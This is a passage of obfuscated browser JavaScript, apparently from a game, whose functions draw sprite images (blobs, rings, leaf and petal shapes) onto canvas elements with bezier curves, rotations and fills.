			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ΔⵠⲆⲆ * ᐃ, 5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 184.048583984375, 69.1805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -40, -28.5 * ᐃ, ᐃ * 80, ᐃ * 57, ᐃ * ⵠⵠⲆΔΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ], Ⲇᐃ[2], Ⲇᐃⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(185.048583984375 * ᐃ, ᐃ * 61.6805419921875);
			Δ.bezierCurveTo(ᐃ * 145.048583984375, ᐃ * 59.6805419921875, ᐃ * 138.048583984375, 41.6805419921875 * ᐃ, ᐃ * 148.048583984375, ᐃ * 33.6805419921875);
			Δ.bezierCurveTo(ᐃ * 169.048583984375, ᐃ * 17.6805419921875, ᐃ * 194.048583984375, 20.6805419921875 * ᐃ, 210.048583984375 * ᐃ, ᐃ * 27.6805419921875);
			Δ.bezierCurveTo(234.048583984375 * ᐃ, ᐃ * 40.6805419921875, ᐃ * 225.048583984375, 57.6805419921875 * ᐃ, 186.048583984375 * ᐃ, ᐃ * 61.6805419921875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⵠᐃΔⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(224.048583984375 * ᐃ, ᐃ * 56.6805419921875);
			Δ.bezierCurveTo(326.048583984375 * ᐃ, 69.6805419921875 * ᐃ, ᐃ * 363.048583984375, ᐃ * 148.6805419921875, ᐃ * 349.048583984375, 206.6805419921875 * ᐃ);
			Δ.bezierCurveTo(329.048583984375 * ᐃ, ᐃ * 278.6805419921875, ᐃ * 252.048583984375, ᐃ * 283.6805419921875, ᐃ * 206.048583984375, 275.6805419921875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 206.548583984375, ᐃ * 266.6805419921875, 206.548583984375 * ᐃ, ᐃ * 266.6805419921875, ᐃ * 207.048583984375, ᐃ * 257.6805419921875);
			Δ.bezierCurveTo(276.048583984375 * ᐃ, 268.6805419921875 * ᐃ, 308.048583984375 * ᐃ, ᐃ * 239.6805419921875, ᐃ * 323.048583984375, ᐃ * 208.6805419921875);
			Δ.bezierCurveTo(352.048583984375 * ᐃ, 145.6805419921875 * ᐃ, 292.048583984375 * ᐃ, ᐃ * 86.6805419921875, 223.048583984375 * ᐃ, 74.6805419921875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃⵠΔ], ⵠⵠⵠⲆⲆ * ᐃ);
			Δ.save();
			Δ.translate(183.548583984375 * ᐃ, 119.6805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, -121.5 * ᐃ, ᐃ * -45, ᐃ * 243, 90 * ᐃ, ᐃ * 40);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * 6);
			Δ.save();
			Δ.translate(ᐃ * 183.048583984375, 155.6805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -121, ᐃ * -52, 242 * ᐃ, 104 * ᐃ, ᐃ * 40);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃΔΔ], 6 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 183.048583984375, ᐃ * 205.1805419921875);
			Ⲇᐃᐃ(Δ, ᐃ * -121, ᐃ * -50.5, 242 * ᐃ, ᐃ * 101, 40 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ], Ⲇᐃ[0], 6 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 185.048583984375, 204.1805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, -100 * ᐃ, -34.5 * ᐃ, ᐃ * 200, 69 * ᐃ, 40 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ], Ⲇᐃ[ⵠⲆᐃⵠ], ⲆᐃⲆΔΔ * ᐃ);
			ⵠᐃᐃ(Δ, 185.048583984375 * ᐃ, 257.6805419921875 * ᐃ, ᐃ * 27.018512172212592);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * 6);
			Δ.globalAlpha = 1;
			Δ.translate(-5 * ᐃ, -ⲆΔΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 224.048583984375, ᐃ * 56.6805419921875);
			Δ.bezierCurveTo(ᐃ * 326.048583984375, 69.6805419921875 * ᐃ, ᐃ * 363.048583984375, 148.6805419921875 * ᐃ, ᐃ * 349.048583984375, ᐃ * 206.6805419921875);
			Δ.bezierCurveTo(329.048583984375 * ᐃ, ᐃ * 278.6805419921875, 252.048583984375 * ᐃ, 283.6805419921875 * ᐃ, ᐃ * 206.048583984375, 275.6805419921875 * ᐃ);
			Δ.bezierCurveTo(206.548583984375 * ᐃ, ᐃ * 266.6805419921875, ᐃ * 206.548583984375, 266.6805419921875 * ᐃ, 207.048583984375 * ᐃ, ᐃ * 257.6805419921875);
			Δ.bezierCurveTo(ᐃ * 276.048583984375, ᐃ * 268.6805419921875, ᐃ * 308.048583984375, 239.6805419921875 * ᐃ, 323.048583984375 * ᐃ, ᐃ * 208.6805419921875);
			Δ.bezierCurveTo(352.048583984375 * ᐃ, 145.6805419921875 * ᐃ, 292.048583984375 * ᐃ, 86.6805419921875 * ᐃ, ᐃ * 223.048583984375, 74.6805419921875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⵠΔⵠ], 6 * ᐃ);
			Δ.save();
			Δ.translate(184.048583984375 * ᐃ, 69.1805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, -40 * ᐃ, ᐃ * -28.5, ᐃ * 80, ᐃ * 57, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆⵠΔΔ], ⵠᐃΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 185.048583984375, 61.6805419921875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145.048583984375, 59.6805419921875 * ᐃ, 138.048583984375 * ᐃ, 41.6805419921875 * ᐃ, ᐃ * 148.048583984375, ᐃ * 33.6805419921875);
			Δ.bezierCurveTo(169.048583984375 * ᐃ, 17.6805419921875 * ᐃ, ᐃ * 194.048583984375, ᐃ * 20.6805419921875, ᐃ * 210.048583984375, ᐃ * 27.6805419921875);
			Δ.bezierCurveTo(ᐃ * 234.048583984375, 40.6805419921875 * ᐃ, 225.048583984375 * ᐃ, 57.6805419921875 * ᐃ, ᐃ * 186.048583984375, 61.6805419921875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⵠᐃᐃΔΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 183.548583984375, 119.6805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -121.5, -45 * ᐃ, ᐃ * 243, ᐃ * 90, ᐃ * 40);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[ΔⲆⲆⲆ], ᐃ * ⵠΔᐃΔⲆ);
			Δ.save();
			Δ.translate(183.048583984375 * ᐃ, 155.6805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -121, ᐃ * -52, ᐃ * 242, 104 * ᐃ, 40 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[Ⲇⵠⵠⵠ], ᐃ * 6);
			Δ.save();
			Δ.translate(183.048583984375 * ᐃ, 205.1805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -121, -50.5 * ᐃ, 242 * ᐃ, ᐃ * 101, ᐃ * 40);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⲆⲆ], Ⲇᐃ[4], ᐃ * 6);
			Δ.globalCompositeOperation = ⵠ[172];
			Δ.save();
			Δ.translate(ᐃ * 185.048583984375, 204.1805419921875 * ᐃ);
			Ⲇᐃᐃ(Δ, -100 * ᐃ, ᐃ * -34.5, ᐃ * 200, ᐃ * 69, 40 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⵠⲆⵠ], Ⲇᐃ[8], ᐃ * ⲆΔᐃΔⵠ);
			Δ.globalCompositeOperation = ⵠ[512];
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(185.048583984375 * ᐃ, ᐃ * 204.1805419921875);
			Ⲇᐃᐃ(Δ, -ⵠⵠΔᐃᐃ * ᐃ, -34.5 * ᐃ, ᐃ * 200, ᐃ * 69, 40 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], ΔᐃⲆᐃ * ᐃ);
			Δ.globalAlpha = ᐃᐃⲆΔ;
			Δ.save();
			ⵠᐃᐃ(Δ, ᐃ * 185.048583984375, ᐃ * 257.6805419921875, ᐃ * 27.018512172212592);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[4], 6 * ᐃ);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⵠᐃⵠⲆⵠⲆⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ, ⵠᐃ, ⲆⲆᐃⲆ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			if (ⵠᐃ == ⲆΔⵠ) {
				var ᐃⵠⵠ = ᐃ * 270;
				var ⵠⵠᐃ = 250 * ᐃ;
				Ⲇⵠ.width = ᐃⵠⵠ;
				Ⲇⵠ.height = ⵠⵠᐃ;
				Δ.beginPath();
				Δ.moveTo(ᐃ * 140, ᐃ * ⵠᐃⵠⲆ);
				Δ.translate(ᐃ * -25, -ΔⲆᐃᐃᐃⲆⲆ * ᐃ);
				Δ.bezierCurveTo(ᐃ * 218, ᐃ * 31, ᐃ * 251, ᐃ * 61, ᐃ * 265, ᐃ * 85);
				Δ.bezierCurveTo(278 * ᐃ, ᐃ * 108, 295 * ᐃ, ᐃ * 160, 285 * ᐃ, 195 * ᐃ);
				Δ.bezierCurveTo(271 * ᐃ, ᐃ * 242, ᐃ * 213, ᐃ * 268, 188 * ᐃ, ᐃ * 266);
				Δ.bezierCurveTo(139 * ᐃ, 262 * ᐃ, 70 * ᐃ, 244 * ᐃ, ᐃ * 47, 204 * ᐃ);
				Δ.bezierCurveTo(ᐃⲆᐃΔⵠ * ᐃ, 158 * ᐃ, ᐃ * 35, 78 * ᐃ, ᐃ * 59, 56 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 90, 28 * ᐃ, 124 * ᐃ, ᐃ * 23, ᐃ * 140, 23 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else if (ⵠᐃ == 1) {
				var ᐃⵠⵠ = 430 * ᐃ;
				var ⵠⵠᐃ = 350 * ᐃ;
				Ⲇⵠ.width = ᐃⵠⵠ;
				Ⲇⵠ.height = ⵠⵠᐃ;
				Δ.beginPath();
				Δ.moveTo(ᐃ * 180, ᐃ * 5);
				Δ.translate(ᐃ * -30, ᐃ * -60);
				Δ.bezierCurveTo(283 * ᐃ, 60 * ᐃ, ᐃ * 265, ᐃ * 163, ᐃ * 335, ᐃ * 206);
				Δ.bezierCurveTo(376 * ᐃ, ᐃ * 231, ᐃ * 492, 299 * ᐃ, ᐃ * 434, ᐃ * 357);
				Δ.bezierCurveTo(371 * ᐃ, ᐃ * 421, ᐃ * 289, 394 * ᐃ, 255 * ᐃ, ᐃ * 386);
				Δ.bezierCurveTo(ᐃ * 218, ᐃ * 377, ᐃ * 91, ᐃ * 359, ᐃ * 50, ᐃ * 272);
				Δ.bezierCurveTo(12 * ᐃ, 192 * ᐃ, ᐃ * 107, 75 * ᐃ, ᐃ * 178, ᐃ * 69);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else if (ⵠᐃ == 2) {
				var ᐃⵠⵠ = ᐃ * 400;
				var ⵠⵠᐃ = ᐃ * 300;
				Ⲇⵠ.width = ᐃⵠⵠ;
				Ⲇⵠ.height = ⵠⵠᐃ;
				Δ.beginPath();
				Δ.moveTo(ᐃ * 80, ᐃ * 52);
				Δ.translate(-40 * ᐃ, ᐃ * -30);
				Δ.bezierCurveTo(124 * ᐃ, 77 * ᐃ, 241 * ᐃ, ᐃ * 22, 311 * ᐃ, 65 * ᐃ);
				Δ.bezierCurveTo(352 * ᐃ, ᐃ * 90, ᐃ * 404, 176 * ᐃ, ᐃ * 346, 234 * ᐃ);
				Δ.bezierCurveTo(283 * ᐃ, 298 * ᐃ, ᐃ * 179, 299 * ᐃ, ᐃ * 145, 291 * ᐃ);
				Δ.bezierCurveTo(108 * ᐃ, ᐃ * 282, 100 * ᐃ, ᐃ * 239, 63 * ᐃ, 205 * ᐃ);
				Δ.bezierCurveTo(37 * ᐃ, 181 * ᐃ, ᐃ * 45, ᐃ * 131, ᐃ * 80, 107 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ])
			}
			return Ⲇⵠ
		}
		const ⵠΔⵠΔ = ⲆⵠⲆⲆ;

		function ΔᐃⲆᐃⲆⵠⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 130;
			var ⵠⵠᐃ = ᐃ * 142;
			var Δⵠ = ᐃⵠⵠ / Δⵠⵠⵠ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(Δⵠ, ⲆⵠⲆ + ᐃ * ⲆⵠⲆᐃⵠⲆΔ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			ⵠᐃᐃ(Δ, ᐃΔΔ, 0, ᐃ * 60);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.translate(ᐃⵠⲆ, -7 * ᐃ);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			ⵠᐃᐃ(Δ, 0, 0, ᐃ * 60, 0);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⵠⲆⵠᐃ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃⵠⲆ, ΔⲆⲆ, 40 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ]);
			ⵠᐃᐃ(Δ, Ⲇᐃⵠⵠ, ᐃⵠΔ, ᐃ * 25);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * 8);
			return Ⲇⵠ
		}
		const ΔᐃⲆⵠⵠΔⵠ = ᐃⵠᐃΔⵠ;

		function ⲆⲆΔΔⲆⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 90 * ᐃ;
			Ⲇⵠ.height = 98 * ᐃ;
			Δ.translate(ΔΔⵠ, ᐃ * ᐃⵠⵠΔ);
			ⵠᐃ === 0 && (Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1, Δ.save(), Δ.translate(44 * ᐃ, ᐃ * 50), Δ.rotate(ᐃΔᐃⲆ), ⵠΔⵠᐃ(Δ, 8, 41 * ᐃ, 10 * ᐃ), ΔⲆ(Δ, Ⲇᐃ[0]), Δ.restore());
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(44 * ᐃ, ᐃ * 44);
			Δ.rotate(1);
			ⵠΔⵠᐃ(Δ, ⵠⲆⲆΔΔ, 41 * ᐃ, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⲆⵠⲆ], 4 * ᐃ);
			Δ.rotate(.56);
			ⵠΔⵠᐃ(Δ, ΔⵠⲆᐃⲆ, ᐃ * 33, ᐃ * ⵠⲆⲆᐃⵠ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ᐃⲆᐃⲆⵠ], ᐃ * 4);
			Δ.rotate(.28);
			ⵠΔⵠᐃ(Δ, ⲆⲆᐃᐃⲆ, ᐃ * 24, ᐃ * 8);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.restore();
			Δ.save();
			Δ.translate(45 * ᐃ, ᐃ * 45);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -ⵠⲆΔⵠⵠ * ᐃ, ᐃ * -25.5, ΔΔⲆⵠⵠᐃᐃ * ᐃ, 51 * ᐃ, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], ᐃ * 2);
			Δ.save();
			Δ.translate(ᐃ * 45, 45 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -26 * ᐃ, -9 * ᐃ, 52 * ᐃ, ⲆⲆΔⲆⵠᐃᐃ * ᐃ, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], ᐃ * Δⵠⵠⵠ);
			ⵠᐃᐃ(Δ, 45 * ᐃ, 29 * ᐃ, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔᐃ]);
			ⵠᐃᐃ(Δ, ᐃ * 45, ᐃ * 61, ᐃ * ⲆⲆⲆᐃΔ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, ᐃ * 28, ᐃ * 45, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔΔ]);
			ⵠᐃᐃ(Δ, 62 * ᐃ, 45 * ᐃ, 7 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔⲆ]);
			return Ⲇⵠ
		}

		function ⵠᐃᐃⲆΔⲆᐃⲆᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 130 * ᐃ;
			var ⵠⵠᐃ = 142 * ᐃ;
			var Δⵠ = ᐃⵠⵠ / ⲆΔΔⵠ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			ⵠᐃᐃ(Δ, Δⵠ, ⲆⵠⲆ, 40 * ᐃ, 0);
			ΔⲆ(Δ, ΔΔⵠᐃΔ, Ⲇᐃ[0], ᐃΔⲆΔᐃ * ᐃ);
			ⵠᐃᐃ(Δ, Δⵠ, ⲆⵠⲆ, ᐃ * 30, 0);
			ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[0], ᐃ * 7);
			ⵠᐃᐃ(Δ, Δⵠ, ⲆⵠⲆ, ᐃ * 20, ⲆΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ᐃΔⵠⵠᐃΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 304 * ᐃ;
			Ⲇⵠ.height = ᐃ * 278;
			Δ.translate(ᐃΔᐃΔⲆ * ᐃ, ᐃ * 25);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⵠΔⵠ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(128 * ᐃ, 137 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 155, ᐃ * 144, 223 * ᐃ, 143 * ᐃ, 256 * ᐃ, 122 * ᐃ);
			Δ.bezierCurveTo(249 * ᐃ, ᐃ * 180, ᐃ * 210, 227 * ᐃ, 164 * ᐃ, 242 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 213, ᐃ * 99, 166 * ᐃ, ᐃ * 127, 138 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(284 * ᐃ, ᐃ * 52);
			Δ.bezierCurveTo(126 * ᐃ, 112 * ᐃ, ᐃ * 89, 177 * ᐃ, ᐃ * 170, ᐃ * 241);
			Δ.bezierCurveTo(103 * ᐃ, 275 * ᐃ, ᐃ * 20, ᐃ * 239, ΔᐃΔⵠⵠ * ᐃ, ᐃ * 159);
			Δ.bezierCurveTo(ᐃ * 5, ᐃ * 76, 75 * ᐃ, ᐃ * 4, ᐃ * 165, ᐃ * 13);
			Δ.bezierCurveTo(233 * ᐃ, ᐃ * 15, ᐃ * 260, 33 * ᐃ, 284 * ᐃ, ᐃ * 52);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			Δ.translate(ᐃ * -ⵠᐃⲆⲆΔ, -25 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(128 * ᐃ, 137 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 155, ᐃ * 144, 223 * ᐃ, 143 * ᐃ, ᐃ * 256, 122 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 249, 180 * ᐃ, ᐃ * 210, ᐃ * 227, ᐃ * 164, 242 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 213, 99 * ᐃ, 166 * ᐃ, ᐃ * 127, ᐃ * 138);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[2], ᐃ * 15);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(284 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(126 * ᐃ, 112 * ᐃ, ᐃ * 89, ᐃ * 177, 170 * ᐃ, ᐃ * 241);
			Δ.bezierCurveTo(103 * ᐃ, ᐃ * 275, ΔΔⲆⵠᐃ * ᐃ, ᐃ * 239, ᐃⲆⲆΔⵠ * ᐃ, 159 * ᐃ);
			Δ.bezierCurveTo(5 * ᐃ, 76 * ᐃ, 75 * ᐃ, Ⲇⵠⵠⵠ * ᐃ, 165 * ᐃ, ᐃ * 13);
			Δ.bezierCurveTo(ᐃ * 233, ᐃ * ΔⲆᐃᐃⲆ, 260 * ᐃ, ᐃ * 33, 284 * ᐃ, 52 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ΔⵠⵠᐃΔᐃⲆ);
			return Ⲇⵠ
		}

		function ΔΔⲆᐃⲆᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 300 * ᐃ;
			Ⲇⵠ.height = ᐃ * 300;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.save();
			Δ.translate(ᐃ * 150, ᐃ * 160);
			Δ.rotate(6.28);
			ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, 146 * ᐃ, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.save();
			Δ.translate(ᐃ * 150, ᐃ * 150);
			Δ.rotate(6.28);
			ⵠΔⵠᐃ(Δ, 6, 146 * ᐃ, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[2], ⵠⵠᐃΔⲆ * ᐃ);
			Δ.save();
			Δ.translate(150 * ᐃ, 150 * ᐃ);
			Δ.rotate(ⲆⲆⲆᐃ);
			ⵠΔⵠᐃ(Δ, ⵠᐃᐃΔΔ, ᐃ * 105, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[ΔⲆΔᐃ], ᐃⵠᐃᐃⵠ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 150, ᐃ * 150);
			Δ.rotate(ΔⲆⵠⲆ);
			ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, 66 * ᐃ, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠΔⲆᐃ], 8 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 131, ᐃ * 116);
			ⵠΔⵠᐃ(Δ, 7, ᐃ * 17, ᐃ * 8);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔᐃΔⵠ]);
			Δ.save();
			Δ.translate(163 * ᐃ, ᐃ * 168);
			ⵠΔⵠᐃ(Δ, ⲆⲆⵠⲆⵠ, 25 * ᐃ, ᐃ * 8);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⵠΔ]);
			Δ.save();
			Δ.translate(117 * ᐃ, ᐃ * 151);
			ⵠΔⵠᐃ(Δ, ᐃⲆⲆᐃᐃ, ᐃ * ᐃᐃⲆΔΔⲆᐃ, ᐃ * 8);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆᐃ]);
			Δ.save();
			Δ.translate(ᐃ * 167, ᐃ * 122);
			ⵠΔⵠᐃ(Δ, 7, 12 * ᐃ, ᐃ * ΔⲆᐃⵠⲆΔⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 150, 207 * ᐃ);
			Δ.bezierCurveTo(150 * ᐃ, ᐃ * 151, ᐃ * 150, ᐃ * 101, 150 * ᐃ, 94 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[2], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 118, ᐃ * ⵠⵠΔᐃᐃ);
			Δ.bezierCurveTo(118 * ᐃ, ᐃ * 205, 118 * ᐃ, 207 * ᐃ, ᐃ * 118, ᐃ * 200);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[2], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 183, ᐃ * 100);
			Δ.bezierCurveTo(183 * ᐃ, ᐃ * 203, ᐃ * 183, ᐃ * 203, ᐃ * 183, ᐃ * 200);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⲆΔᐃ], 8 * ᐃ);
			return Ⲇⵠ
		}

		function ⵠⲆΔⵠΔⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 501 * ᐃ;
			Ⲇⵠ.height = ᐃ * 309;
			Δ.translate(0, ᐃ * 6);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(126 * ᐃ, ᐃ * 184);
			Δ.bezierCurveTo(ᐃ * 169, ᐃ * 196, ᐃ * 194, 198 * ᐃ, ᐃ * 227, 198 * ᐃ);
			Δ.bezierCurveTo(235 * ᐃ, 222 * ᐃ, ᐃ * 236, ᐃ * 223, ᐃ * 241, ᐃ * 226);
			Δ.bezierCurveTo(245 * ᐃ, 228 * ᐃ, 257 * ᐃ, ᐃ * 228, ᐃ * 263, 226 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 267, 225 * ᐃ, ᐃ * 270, ᐃ * 211, ᐃ * 275, 198 * ᐃ);
